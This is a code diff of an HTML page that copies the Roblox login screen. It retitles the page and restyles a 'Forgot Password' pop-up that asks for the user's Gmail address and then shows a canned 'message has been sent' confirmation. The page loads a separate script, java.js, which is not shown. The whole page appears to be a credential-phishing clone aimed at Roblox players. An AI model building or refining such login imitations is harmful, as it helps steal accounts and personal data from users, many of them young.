@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Login</title>
+    <title>Roblox | Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <script src="java.js" defer></script>
@@ -52,16 +52,17 @@
                     <button type="submit" class="login-btn">Log In</button>
                 </form>
 
-                <a href="#" class="forgot-link" id="forgotLink" style="color:#bbb; text-decoration:underline;">Forgot Password or Username?</a>
-                <div id="forgotFrame" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); align-items:center; justify-content:center; z-index:999;">
-                    <div style="background:#181818; padding:28px 32px; border-radius:12px; text-align:center; position:relative; box-shadow:0 4px 24px rgba(0,0,0,0.7); color:#eee;">
-                        <span id="closeForgot" style="position:absolute; top:10px; right:16px; cursor:pointer; font-size:22px; color:#bbb;">&times;</span>
-                        <h2 style="color:#fff; margin-bottom:16px;">Enter gmail</h2>
-                        <input type="email" id="forgotEmail" placeholder="Enter your Gmail" style="width:80%; padding:10px; margin:14px 0; border-radius:6px; border:1px solid #333; background:#222; color:#eee;">
-                        <button id="sendForgotBtn" style="padding:10px 22px; background:#222; color:#fff; border:none; border-radius:6px; font-weight:600; cursor:pointer; margin-top:8px;">Send</button>
-                        <div id="forgotMsg" style="margin-top:14px; color:#4caf50; display:none;">A message has been sent to your email.</div>
-                    </div>
-                </div>
+              <a href="#" class="forgot-link" id="forgotLink">Forgot Password or Username?</a>
+    <div id="forgotFrame">
+        <div>
+            <span id="closeForgot">&times;</span>
+            <h2>Enter gmail</h2>
+            <input type="email" id="forgotEmail" placeholder="Enter your Gmail">
+            <button id="sendForgotBtn">Send</button>
+            <div id="forgotMsg">A message has been sent to your email.</div>
+        </div>
+    </div>
+
                 
 
                 <div class="alternative-options">
